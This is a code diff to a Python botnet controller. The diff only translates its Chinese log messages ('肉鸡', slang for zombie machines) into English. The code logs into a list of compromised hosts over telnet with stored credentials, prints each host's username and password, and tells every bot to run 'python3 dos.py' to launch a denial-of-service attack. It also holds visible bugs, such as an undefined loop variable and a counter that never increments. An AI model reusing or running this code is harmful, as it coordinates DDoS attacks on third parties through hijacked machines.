@@ -7,7 +7,7 @@ class Trigger(object):
 
     def login(self,Hosts):
         ChickenNum = len(Hosts)
-        print('您有肉鸡数量:',ChickenNum)
+        print('total ctrled:',ChickenNum)
         devs = []
         for Chiken in Chikens:
             dev = telnetlib.Telnet(Chiken['host'], port=23)
@@ -18,8 +18,8 @@ class Trigger(object):
             dev.read_until(b'Password:')
             dev.write(Chiken['passwd'] + b'\n')
             dev.read_until(b'$')
-            print("肉鸡",str(Chiken['host'],encoding='utf-8'),"登录成功!")
-            print("用户名:",str(Chiken['user'],encoding='utf-8'), "密码:",str(Chiken['passwd'],encoding='utf-8'))
+            print("ctrled",str(Chiken['host'],encoding='utf-8'),"login success!")
+            print("user:",str(Chiken['user'],encoding='utf-8'), "passwd:",str(Chiken['passwd'],encoding='utf-8'))
             devs.append(dev)
         return devs
 
@@ -34,7 +34,7 @@ class Trigger(object):
     def dosAction(self,devs):
         i = 1
         for dev in devs:
-            print('第',i,'号肉鸡开始执行攻击..........................')
+            print('num ',i,' ctrled start action ..........................')
             dev.write(b'python3 dos.py' + b'\n')
             dev.read_until(b'$')
             i = i + 1
@@ -43,7 +43,7 @@ class Trigger(object):
         i = 1
         for dev in devs:
             telnetlib.Telnet.close(dev)
-            print('第', i, '号肉鸡下线.............................')
+            print('num', i, ' ctrled log out.............................')
             i = 1 + 1
 
 if __name__ == '__main__':
